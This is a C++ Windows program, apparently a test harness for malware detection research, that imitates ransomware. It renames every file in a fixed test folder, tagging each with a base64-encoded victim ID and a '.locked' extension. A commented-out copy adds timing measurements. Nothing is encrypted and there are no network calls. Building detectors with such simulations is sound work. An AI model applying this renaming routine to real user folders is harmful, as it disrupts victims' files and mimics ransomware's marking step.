#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <sstream>
#include <iomanip>

// Simple base64 encoding for illustration
std::string base64_encode(const std::string& in) {
	static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (uint8_t c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(table[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');
	return out;
}

// Renames files in a directory to add a ransomware extension
void RenameFilesWithExtension(const std::wstring & directory, const std::wstring & extension, const std::string & victimId = "") {
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	std::wstring searchPath = directory + L"\\*.*";
	hFind = FindFirstFile(searchPath.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Could not open directory: " << directory << std::endl;
		return;
	}

	do {
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::wstring oldPath = directory + L"\\" + findFileData.cFileName;

			// Compose new file name: [OriginalName].[VictimID].[Extension]
			std::wstring newFileName = findFileData.cFileName;
			size_t dotPos = newFileName.find_last_of(L".");
			if (dotPos != std::wstring::npos)
				newFileName = newFileName.substr(0, dotPos); // strip old extension

			// Append base64-encoded victim ID, if present
			std::wstring encodedId;
			if (!victimId.empty()) {
				std::string encoded = base64_encode(victimId);
				encodedId = L"." + std::wstring(encoded.begin(), encoded.end());
			}

			std::wstring newPath = directory + L"\\" + newFileName + encodedId + extension;

			// Rename file
			if (MoveFileW(oldPath.c_str(), newPath.c_str())) {
				std::wcout << L"[+] Renamed: " << oldPath << L" -> " << newPath << std::endl;
			}
			else {
				std::wcerr << L"[-] Failed to rename: " << oldPath << std::endl;
			}
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

	FindClose(hFind);
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and rename files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		// -- BEGIN Ransomware-Like File Renaming --
		std::wstring directory = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
		std::wstring extension = L".locked"; // or L".REvil", L".encrypted"
		std::string victimId = "testvictim"; // Example victim ID to encode

		RenameFilesWithExtension(directory, extension, victimId);
		// -- END Ransomware-Like File Renaming --

		Beep(500, 500);
	}
	return 0;
}




/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <sstream>
#include <iomanip>
#include <chrono>

// Simple base64 encoding for illustration
std::string base64_encode(const std::string& in) {
	static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (uint8_t c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(table[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');
	return out;
}

// Renames files in a directory to add a ransomware extension, and calculates timing overhead
void RenameFilesWithExtension(const std::wstring & directory, const std::wstring & extension, const std::string & victimId = "") {
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	std::wstring searchPath = directory + L"\\*.*";
	hFind = FindFirstFile(searchPath.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Could not open directory: " << directory << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::wstring oldPath = directory + L"\\" + findFileData.cFileName;

			// Compose new file name: [OriginalName].[VictimID].[Extension]
			std::wstring newFileName = findFileData.cFileName;
			size_t dotPos = newFileName.find_last_of(L".");
			if (dotPos != std::wstring::npos)
				newFileName = newFileName.substr(0, dotPos); // strip old extension

			// Append base64-encoded victim ID, if present
			std::wstring encodedId;
			if (!victimId.empty()) {
				std::string encoded = base64_encode(victimId);
				encodedId = L"." + std::wstring(encoded.begin(), encoded.end());
			}

			std::wstring newPath = directory + L"\\" + newFileName + encodedId + extension;

			auto start = std::chrono::high_resolution_clock::now();

			BOOL result = MoveFileW(oldPath.c_str(), newPath.c_str());

			auto end = std::chrono::high_resolution_clock::now();
			std::chrono::duration<double, std::micro> duration = end - start;

			totalMicroseconds += duration.count();
			++attemptCount;

			if (result) {
				std::wcout << L"[+] Renamed: " << oldPath << L" -> " << newPath
					<< L" (Time: " << duration.count() << L" µs)\n";
			}
			else {
				std::wcerr << L"[-] Failed to rename: " << oldPath
					<< L" (FakeSuccess or real failure) - Time: " << duration.count() << L" µs\n";
			}
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::wcout << L"[*] Total files attempted: " << attemptCount << L"\n";
		std::wcout << L"[*] Total time spent: " << totalMicroseconds << L" µs\n";
		std::wcout << L"[*] Average time per attempt: " << avgTime << L" µs\n";
	}
	else {
		std::wcout << L"[!] No files found to rename.\n";
	}
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and rename files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		// -- BEGIN Ransomware-Like File Renaming with timing overhead --
		std::wstring directory = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
		std::wstring extension = L".locked"; // or L".REvil", L".encrypted"
		std::string victimId = "testvictim"; // Example victim ID to encode

		RenameFilesWithExtension(directory, extension, victimId);
		// -- END Ransomware-Like File Renaming with timing overhead --

		Beep(500, 500);
	}
	return 0;
}
*/